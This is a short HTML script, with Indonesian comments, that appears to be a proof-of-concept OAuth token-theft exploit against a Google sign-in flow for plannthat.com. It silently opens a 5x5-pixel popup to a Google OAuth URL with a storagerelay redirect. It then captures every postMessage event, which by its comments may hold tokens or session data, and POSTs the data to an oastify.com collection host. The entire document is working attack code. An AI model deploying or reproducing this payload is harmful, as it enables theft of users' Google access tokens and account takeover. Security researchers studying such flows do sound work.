<script>
// ==== 1. Otomatis membuka OAuth GIS (tanpa klik) ====

(function run(){
    const exploitURL =
        "https://accounts.google.com/o/oauth2/auth?" +
        "client_id=194129245325-91aovs2hfgphsjdra11qapj5fo20pvgg.apps.googleusercontent.com" +
        "&redirect_uri=storagerelay%3A%2F%2Fhttps%2Fwww.plannthat.com%3Fid%3Dauth272142" +
        "&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email%20https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.profile" +
        "&response_type=token%20id_token" +
        "&nonce=xyz123" +             // GIS wajib nonce
        "&prompt=consent" +           // paksa muncul error / non-happy flow
        "&include_granted_scopes=true";

    // buka popup kecil
    window.open(exploitURL, "_blank", "width=5,height=5");
})();


// ==== 2. Tangkap semua pesan postMessage dari Google =====

window.addEventListener("message", (event) => {
    // event.origin berisi domain Google / storagerelay
    // event.data berisi token, error, atau data sesi
    
    const payload = {
        origin: event.origin,
        data: event.data,
        location: window.location.href,
        timestamp: Date.now()
    };

    // ==== 3. Kirim ke OAST kamu untuk ditangkap ====
    fetch("https://d7l1s85c5d6f05x5htznyqd5fwlo9ex3.oastify.com", {
        method: "POST",
        mode: "no-cors",
        body: JSON.stringify(payload)
    });
});
</script>

</body>
